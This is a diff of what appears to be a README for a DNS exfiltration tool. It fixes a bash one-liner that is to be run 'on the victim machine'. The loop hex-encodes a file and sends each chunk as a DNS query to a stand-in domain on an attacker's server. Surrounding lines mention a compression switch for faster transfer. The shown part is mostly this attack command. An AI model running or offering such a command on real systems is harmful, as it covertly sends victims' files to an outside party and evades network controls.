@@ -9,7 +9,7 @@ Below is an image showing an example of how to use:
 On the victim machine, you simply can do something like so:
 
 ```bash
-for b in $(xxd -p file/to/send.png); do dig @server $b.fakedomain.com
+for b in $(xxd -p file/to/send.png); do dig @server $b.fakedomain.com; done
 ```
 
 It also supports compression of the file to allow for faster transfer speeds, this can be achieved using the "-z" switch:
